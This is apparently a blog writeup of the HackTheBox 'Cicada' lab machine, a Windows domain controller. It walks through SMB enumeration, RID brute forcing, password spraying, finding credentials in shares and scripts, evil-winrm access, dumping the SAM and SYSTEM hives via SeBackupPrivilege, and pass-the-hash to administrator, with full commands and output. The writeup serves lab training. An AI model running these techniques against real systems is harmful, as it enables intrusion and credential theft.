---
title: HackTheBox Cicada Writeup
authors: Samarth
date: 2024-10-20 14:00:00 +0530
categories: [HackTheBox , Machines]
tags: [Windows, Active Directory, SMB, LDAP]
math: true
mermaid: true
---

![Cicada - HTB](/assets/images/writeups/Cicada-HTB/banner.png)

## TL;DR

This writeup is based on [__Cicada__](https://app.hackthebox.com/machines/Cicada){:target="_blank"} machine, which is an easy-rated Windows box on Hack the Box. It starts with several services, such as DNS, Kerberos, MSRPC, NetBIOS-SSN, LDAP, Microsoft-DS, RPC over HTTP, SSL/LDAP, and Active Directory services. While enumerating SMB shares, the `HR` share contains a text file that reveals a default password. Later, by using the default password, we enumerated the username using `CrackMapExec`. It turns out that the default password belongs to a user called `michael.wrightson`. With Michael's credentials, we dumped domain information using `ldapdomaindump`. Through the domain_users enumeration, we discovered another password belonging to a user named `david.orelious` from the description. We used David's credentials to access the `DEV` share and found a PowerShell script that reveals another credential belonging to `emily.oscars`. Using Emily's credentials, we gained access to a shell, where we found the user flag. While elevating privileges, we found `SeBackupPrivilege`, which allowed us to download the SAM and SYSTEM files. Later, we used `pypykatz` to extract hashes with the help of the SAM and SYSTEM files. Using the administrator hash, we logged in as the administrator user and found the root flag.

## Scanning Network

I started with an Nmap scan and found ports 53, 88, 135, 139, 389, 445, 593, 636, 3268, and 3269 open, corresponding to DNS, Kerberos, MSRPC, NetBIOS-SSN, LDAP, Microsoft-DS, RPC over HTTP, SSL/LDAP, and Active Directory services. The host appears to be a Windows domain controller (`CICADA-DC`) with Active Directory services, including LDAP and SMB, potentially offering attack vectors. Let's see the Nmap results.

```bash
nmap -sC -sV -A -T4 -Pn 10.10.11.35 -oN scan/normal.scan 
Starting Nmap 7.94 ( https://nmap.org ) at 2024-10-19 18:59 IST
Nmap scan report for 10.10.11.35
Host is up (0.16s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-19 20:30:14Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m02s
| smb2-time: 
|   date: 2024-10-19T20:30:59
|_  start_date: N/A
 ```

Starting enumeration with SMB is crucial because it often reveals shared resources, sensitive files, and user information, making it a rich source of data in Windows environments. Additionally, SMB frequently suffers from misconfigurations and vulnerabilities, providing potential attack vectors for further exploitation.


## Enumeration

In the enumeration phase, the focus will be on enumerating `SMB/NetBIOS` on ports 139 and 445.

We will use `smbclient` to list the shares on the target.

```bash
Command - smbclient -L //10.10.11.35/

Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DEV             Disk      
        HR              Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
```
The SMB share enumeration revealed several shares on the target, including administrative shares like `ADMIN$` and `C$`, as well as resource shares like `DEV`, `HR`, `NETLOGON`, and `SYSVOL`. Let's enumerate `HR` and `DEV` shares.

```bash
smbclient //10.10.11.35/DEV  
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
```
The `DEV` share is inaccessible, as listing the content of the share is not possible. We will move ahead to enumerate the `HR` share.

```bash
smbclient //10.10.11.35/HR 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 17:59:09 2024
  ..                                  D        0  Thu Mar 14 17:51:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 23:01:48 2024

                4168447 blocks of size 4096. 330716 blocks available
```
We have found a text file. We will now transfer it to our local machine.

```plaintext
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```
We have retrieved a welcome message from the `Notice from HR.txt` file. The message serves as a welcome note to a new employee at Cicada Corp, emphasizing the importance of changing the default password. The default password provided in the text file is `Cicada$M6Corpb@Lp#nZp!8*`.

Let’s use crackmapexec to enumerate the SMB service. We have attempted multiple methods, including `--shares`, `--users`, and `--sessions`, to gather more information, but there has been no success. Now, we will try enumerating using RID brute forcing.

RID Brute Forcing (`--rid-brute`) is a technique used in Windows environments to enumerate user accounts by exploiting the Security Identifier (SID) structure. This method can help identify user accounts, including those that may not be visible through standard enumeration techniques.

```bash
crackmapexec smb 10.10.11.35 -u anonymous -p '' --rid-brute
SMB         10.10.11.35     445    CICADA-DC        [*] Windows 10.0 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\anonymous: 
SMB         10.10.11.35     445    CICADA-DC        [+] Brute forcing RIDs
SMB         10.10.11.35     445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

We have found multiple users through brute forcing. Now, we will try the default password with each username to see which one will result in a successful login.

```bash
crackmapexec smb 10.10.11.35 -u users-cicada.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
SMB         10.10.11.35     445    CICADA-DC        [*] Windows 10.0 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp
```

As we observe the above output, `michael.wrightson` is the username associated with the password `Cicada$M6Corpb@Lp#nZp!8*`.

We will be using `ldapdomaindump` to dump all the information related to the domain using the credentials of `michael.wrightson`.

```bash
ldapdomaindump ldap://10.10.11.35 -u 'cicada.htb\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
Let’s view all the dumped information and see if we can find anything of interest.

![Domain Users](/assets/images/writeups/Cicada-HTB/1.png)

We have found the password of another user, `david.orelious`, which is `aRt$Lp#7t*VQ!3`, in the description.

```bash
smbclient //10.10.11.35/DEV --user=david.orelious --password='aRt$Lp#7t*VQ!3'

smb: \> ls
  .                                   D        0  Thu Mar 14 18:01:39 2024
  ..                                  D        0  Thu Mar 14 17:51:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 22:58:22 2024

                4168447 blocks of size 4096. 337554 blocks available
smb: \> get Backup_script.ps1
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)

```

The `DEV` share is accessible via the `david.orelious` user, and we have found one PowerShell script available in the share.

```bash
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

The PowerShell script we discovered contains an additional set of credentials. Specifically, it reveals another user account- `emily.oscars`, with the associated password `Q!3@Lp#M6b7tVt`.

## Exploitation

We will use the credentials found in the PowerShell script to gain shell access using `evil-winrm`.

Evil-WinRM is a popular post-exploitation tool used by penetration testers and red teamers to interact with Windows systems over Windows Remote Management (WinRM). It provides a command-line interface to execute commands, upload/download files, and interact with the target system using valid credentials.

```powershell
evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami
cicada\emily.oscars
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> type user.txt
312b64c6de4f********************
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> 
```

A successful login to the shell of emily allows us to obtain the user flag.

## Post Exploitation

To elevate our privileges, let’s check the privileges available to the current user.

```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

The current user is assigned multiple privileges, including the ability to read, back up, and restore files and directories regardless of assigned permissions. The user can also shut down the system and traverse directories. We will first use the privilege to back up files and directories to elevate our privileges.

Given that we have permission to traverse the directory, let’s navigate to the `C:\` directory and create a `Temp` directory. After changing the directory to Temp, we will use our `SeBackupPrivilege` to read the `SAM` file and save a variant of it. Similarly, we will read the `SYSTEM` file and save a variant of it.

```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> cd c:\
*Evil-WinRM* PS C:\> mkdir Temp

Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/20/2024   6:54 AM                Temp

*Evil-WinRM* PS C:\> reg save hklm\sam c:\Temp\sam
The operation completed successfully.

*Evil-WinRM* PS C:\> reg save hklm\system c:\Temp\system
The operation completed successfully.
```
Now, let’s move to the `Temp` directory, where we should have a `SAM` and a `SYSTEM` file. We will download these files from the target machine to our local machine.

```bash
*Evil-WinRM* PS C:\Temp> download sam
                                        
Info: Downloading C:\Temp\sam to sam
                                        
Info: Download successful!

*Evil-WinRM* PS C:\Temp> download system
                                        
Info: Downloading C:\Temp\system to system
                                        
Info: Download successful!

```

We can extract `SAM` and `SYSTEM` file using different methods such as using `Diskshadow & Robocopy`.

We can extract the hive secrets from the SAM and SYSTEM file using the `pypykatz`.

Pypykatz is a Python-based tool used for extracting credentials and hashes from the Windows operating system, particularly from the memory of a running process. Pypykatz can also be used to extract password hashes and credentials from the `SAM (Security Account Manager)` and `SYSTEM` registry hives.

```bash
pypykatz registry --sam sam system

WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: 3c2b033757a49110a9ee680b46e8d620
============== SAM hive secrets ==============
HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```

We will be using the administrator hash to gain access as the administrator user.

```bash
evil-winrm -i 10.10.11.35 -u 'administrator' -H "2b87e7c93a3e8a0ea4a581937016f341"
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
cicada\administrator
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
59da4ee2c04e********************
```

Thanks for reading this far. If you enjoyed the writeup, do support me [__here__](https://www.buymeacoffee.com/h4xplo1t){:target="_blank"}.